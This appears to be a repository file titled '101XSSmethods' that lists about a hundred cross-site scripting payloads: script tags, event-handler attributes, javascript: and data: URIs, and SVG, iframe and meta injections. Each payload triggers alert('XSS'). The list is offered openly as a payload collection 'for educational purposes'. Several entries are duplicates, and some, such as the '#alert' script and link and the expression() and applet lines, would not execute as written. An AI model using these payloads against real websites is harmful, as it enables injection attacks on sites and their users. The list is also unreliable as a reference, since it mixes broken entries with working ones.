# 101XSSmethods
/* 
Hi, im DimaProggramer 
I collected 100 and 1 method for XSS attack
use for educational purposes 
*/

// Lets start

<!-- Basic Alert -->
<script>alert('XSS')</script> <!-- Basic alert -->

<!-- Image Tag -->
<img src="x" onerror="alert('XSS')"> <!-- Image tag with onerror -->

<!-- IFRAME -->
<iframe src="javascript:alert('XSS');"></iframe> <!-- IFRAME with javascript source -->

<!-- Body Onload -->
<body onload="alert('XSS')"> <!-- Body onload attribute -->

<!-- Link -->
<a href="javascript:alert('XSS')">Click me</a> <!-- Link with javascript href -->

<!-- Form Action -->
<form action="javascript:alert('XSS')">
  <input type="submit" value="Submit">
</form> <!-- Form action with javascript -->

<!-- DIV OnMouseOver -->
<div onmouseover="alert('XSS')">Hover over me</div> <!-- DIV with onmouseover -->

<!-- Input Field -->
<input type="text" value="XSS" onfocus="alert('XSS')"> <!-- Input field with onfocus -->

<!-- Button OnClick -->
<button onclick="alert('XSS')">Click me</button> <!-- Button with onclick -->

<!-- Script inside SVG -->
<svg onload="alert('XSS')"></svg> <!-- SVG with onload -->

<!-- Script in Metadata -->
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');"> <!-- Meta tag with refresh -->

<!-- OnError with Image -->
<img src="invalid-image" onerror="alert('XSS')"> <!-- Image with onerror -->

<!-- OnMouseOut with DIV -->
<div onmouseout="alert('XSS')">Move cursor away</div> <!-- DIV with onmouseout -->

<!-- Script via CSS Background -->
<div style="background-image: url('javascript:alert(\'XSS\')');"></div> <!-- CSS background-image -->

<!-- Input Field OnChange -->
<input type="text" onchange="alert('XSS')"> <!-- Input with onchange -->

<!-- OnClick with Image -->
<img src="#" onclick="alert('XSS')"> <!-- Image with onclick -->

<!-- Object Data Attribute -->
<object data="javascript:alert('XSS')"></object> <!-- Object tag -->

<!-- Base Tag -->
<base href="javascript:alert('XSS')//"> <!-- Base tag with javascript href -->

<!-- List Item OnClick -->
<li onclick="alert('XSS')">Click me</li> <!-- List item with onclick -->

<!-- Table Row OnMouseOver -->
<tr onmouseover="alert('XSS')">
  <td>Hover over row</td>
</tr> <!-- Table row with onmouseover -->

<!-- Document Write -->
<script>document.write('<img src="x" onerror="alert(\'XSS\')">');</script> <!-- Document write -->

<!-- Inline Style -->
<div style="width: expression(alert('XSS'));">XSS</div> <!-- Inline style with expression -->

<!-- Textarea -->
<textarea onfocus="alert('XSS')">XSS</textarea> <!-- Textarea with onfocus -->

<!-- Select Option -->
<select onchange="alert('XSS')">
  <option>XSS</option>
</select> <!-- Select with onchange -->

<!-- Marquee -->
<marquee onstart="alert('XSS')">XSS</marquee> <!-- Marquee with onstart -->

<!-- Script Tag with Event Handler -->
<script onload="alert('XSS')"></script> <!-- Script tag with onload -->

<!-- Audio Tag -->
<audio src="x" onerror="alert('XSS')"></audio> <!-- Audio tag with onerror -->

<!-- Video Tag -->
<video src="x" onerror="alert('XSS')"></video> <!-- Video tag with onerror -->

<!-- SVG Animation -->
<svg><animate attributeName="xlink:href" to="javascript:alert('XSS')"></animate></svg> <!-- SVG animation -->

<!-- MathML -->
<math href="javascript:alert('XSS')"></math> <!-- MathML with href -->

<!-- HTML5 Canvas -->
<canvas onmousemove="alert('XSS')"></canvas> <!-- Canvas with onmousemove -->

<!-- Input Type Image -->
<input type="image" src="x" onerror="alert('XSS')"> <!-- Input type image with onerror -->

<!-- OnBlur Event -->
<input type="text" onblur="alert('XSS')"> <!-- Input with onblur -->

<!-- Applet Tag -->
<applet code="javascript:alert('XSS')"></applet> <!-- Applet tag -->

<!-- Frame -->
<frame src="javascript:alert('XSS')"> <!-- Frame with javascript src -->

<!-- Object Tag -->
<object data="javascript:alert('XSS')"></object> <!-- Object tag with javascript data -->

<!-- Embed Tag -->
<embed src="javascript:alert('XSS')"> <!-- Embed tag with javascript src -->

<!-- Input Type Button -->
<input type="button" value="Click" onclick="alert('XSS')"> <!-- Input type button with onclick -->

<!-- Meta Tag -->
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')"> <!-- Meta tag with refresh -->

<!-- Iframe Srcdoc -->
<iframe srcdoc="<script>alert('XSS')</script>"></iframe> <!-- Iframe with srcdoc -->

<!-- SVG Use Element -->
<svg><use href="javascript:alert('XSS')"></use></svg> <!-- SVG use element -->

<!-- SVG Set Element -->
<svg><set attributeName="xlink:href" to="javascript:alert('XSS')"></set></svg> <!-- SVG set element -->

<!-- Progress Tag -->
<progress value="0" onmouseover="alert('XSS')">XSS</progress> <!-- Progress tag with onmouseover -->

<!-- Meter Tag -->
<meter value="2" min="0" max="10" onmouseover="alert('XSS')">XSS</meter> <!-- Meter tag with onmouseover -->

<!-- Details Tag -->
<details ontoggle="alert('XSS')">XSS</details> <!-- Details tag with ontoggle -->

<!-- Summary Tag -->
<summary onmouseover="alert('XSS')">XSS</summary> <!-- Summary tag with onmouseover -->

<!-- Output Tag -->
<output onfocus="alert('XSS')">XSS</output> <!-- Output tag with onfocus -->

<!-- Keygen Tag -->
<keygen autofocus onfocus="alert('XSS')">XSS</keygen> <!-- Keygen tag with onfocus -->

<!-- Script in CSS -->
<style>
  body {
    background-image: url('javascript:alert("XSS")');
  }
</style> <!-- CSS with javascript background-image -->

<!-- Input Type Email -->
<input type="email" value="xss" onfocus="alert('XSS')"> <!-- Input type email with onfocus -->

<!-- Input Type URL -->
<input type="url" value="xss" onfocus="alert('XSS')"> <!-- Input type url with onfocus -->

<!-- Script Tag with Data URI -->
<script src="data:text/javascript,alert('XSS')"></script> <!-- Script tag with data URI -->

<!-- Anchor Tag Href with Data URI -->
<a href="data:text/html,<script>alert('XSS')</script>">Click me</a> <!-- Anchor tag with data URI -->

<!-- Script in Comment -->
<!--[if true]><script>alert('XSS')</script><![endif]--> <!-- Script in comment -->

<!-- Script in CDATA -->
<![CDATA[<script>alert('XSS')</script>]]> <!-- Script in CDATA -->

<!-- Style Attribute -->
<div style="xss:expression(alert('XSS'))">XSS</div> <!-- Style attribute with expression -->

<!-- Script in Srcdoc Attribute -->
<iframe srcdoc="&lt;script>alert('XSS')&lt;/script>"></iframe> <!-- Script in srcdoc attribute -->

<!-- SVG Pattern -->
<svg><pattern id="x" onload="alert('XSS')"></pattern></svg> <!-- SVG pattern -->

<!-- SVG Filter -->
<svg><filter id="x" onload="alert('XSS')"></filter></svg> <!-- SVG filter -->

<!-- SVG FeImage -->
<svg><feImage xlink:href="javascript:alert('XSS')"></feImage></svg> <!-- SVG feImage -->

<!-- Event Attribute -->
<div onclick="alert('XSS')">XSS</div> <!-- DIV with onclick -->

<!-- Form with Input Tag -->
<form><input name="x" value="<script>alert('XSS')"></form> <!-- Form with input -->

<!-- Base Tag Href -->
<base href="javascript:alert('XSS');"> <!-- Base tag with javascript href -->

<!-- Input Type Search -->
<input type="search" onsearch="alert('XSS')"> <!-- Input type search with onsearch -->

<!-- Button Tag with Formaction -->
<button formaction="javascript:alert('XSS')">Click</button> <!-- Button with formaction -->

<!-- Script Tag with Hash -->
<script>#alert('XSS')</script> <!-- Script tag with hash -->

<!-- Link Tag with Hash -->
<a href="#alert('XSS')">Click me</a> <!-- Link with hash -->

<!-- OnError Attribute -->
<img src="x" onerror="alert('XSS')"> <!-- Image with onerror -->

<!-- OnSubmit Attribute -->
<form onsubmit="alert('XSS')">
  <input type="submit" value="Submit">
</form> <!-- Form with onsubmit -->

<!-- OnReset Attribute -->
<form onreset="alert('XSS')">
  <input type="reset" value="Reset">
</form> <!-- Form with onreset -->

<!-- OnFocus Attribute -->
<input type="text" onfocus="alert('XSS')"> <!-- Input with onfocus -->

<!-- OnBlur Attribute -->
<input type="text" onblur="alert('XSS')"> <!-- Input with onblur -->

<!-- OnKeyUp Attribute -->
<input type="text" onkeyup="alert('XSS')"> <!-- Input with onkeyup -->

<!-- OnKeyDown Attribute -->
<input type="text" onkeydown="alert('XSS')"> <!-- Input with onkeydown -->

<!-- OnKeyPress Attribute -->
<input type="text" onkeypress="alert('XSS')"> <!-- Input with onkeypress -->

<!-- OnDblClick Attribute -->
<div ondblclick="alert('XSS')">Double click me</div> <!-- DIV with ondblclick -->

<!-- OnMouseDown Attribute -->
<div onmousedown="alert('XSS')">Click me</div> <!-- DIV with onmousedown -->

<!-- OnMouseUp Attribute -->
<div onmouseup="alert('XSS')">Release me</div> <!-- DIV with onmouseup -->

<!-- OnMouseMove Attribute -->
<div onmousemove="alert('XSS')">Move over me</div> <!-- DIV with onmousemove -->

<!-- OnMouseEnter Attribute -->
<div onmouseenter="alert('XSS')">Enter me</div> <!-- DIV with onmouseenter -->

<!-- OnMouseLeave Attribute -->
<div onmouseleave="alert('XSS')">Leave me</div> <!-- DIV with onmouseleave -->

<!-- OnWheel Attribute -->
<div onwheel="alert('XSS')">Scroll me</div> <!-- DIV with onwheel -->

<!-- OnDrag Attribute -->
<div ondrag="alert('XSS')">Drag me</div> <!-- DIV with ondrag -->

<!-- OnDrop Attribute -->
<div ondrop="alert('XSS')">Drop me</div> <!-- DIV with ondrop -->

<!-- OnContextMenu Attribute -->
<div oncontextmenu="alert('XSS')">Right click me</div> <!-- DIV with oncontextmenu -->

<!-- OnCopy Attribute -->
<div oncopy="alert('XSS')">Copy me</div> <!-- DIV with oncopy -->

<!-- OnCut Attribute -->
<div oncut="alert('XSS')">Cut me</div> <!-- DIV with oncut -->

<!-- OnPaste Attribute -->
<div onpaste="alert('XSS')">Paste into me</div> <!-- DIV with onpaste -->

<!-- OnResize Attribute -->
<div onresize="alert('XSS')">Resize me</div> <!-- DIV with onresize -->

<!-- OnScroll Attribute -->
<div onscroll="alert('XSS')">Scroll me</div> <!-- DIV with onscroll -->

<!-- OnSelect Attribute -->
<input type="text" onselect="alert('XSS')"> <!-- Input with onselect -->

<!-- OnUnload Attribute -->
<body onunload="alert('XSS')"> <!-- Body with onunload -->

<!-- OnAbort Attribute -->
<img src="x" onabort="alert('XSS')"> <!-- Image with onabort -->

<!-- OnCanPlay Attribute -->
<video src="x" oncanplay="alert('XSS')"></video> <!-- Video with oncanplay -->

<!-- OnCanPlayThrough Attribute -->
<video src="x" oncanplaythrough="alert('XSS')"></video> <!-- Video with oncanplaythrough -->

<!-- OnDurationChange Attribute -->
<video src="x" ondurationchange="alert('XSS')"></video> <!-- Video with ondurationchange -->

<!-- OnEmptied Attribute -->
<video src="x" onemptied="alert('XSS')"></video> <!-- Video with onemptied -->

<!-- OnEnded Attribute -->
<video src="x" onended="alert('XSS')"></video> <!-- Video with onended -->

<!-- OnLoadedData Attribute -->
<video src="x" onloadeddata="alert('XSS')"></video> <!-- Video with onloadeddata -->

<!-- OnLoadedMetadata Attribute -->
<video src="x" onloadedmetadata="alert('XSS')"></video> <!-- Video with onloadedmetadata -->

<!-- OnLoadStart Attribute -->
<video src="x" onloadstart="alert('XSS')"></video> <!-- Video with onloadstart -->

// repeat: use for educational purposes (ah, exactly im just a sign)
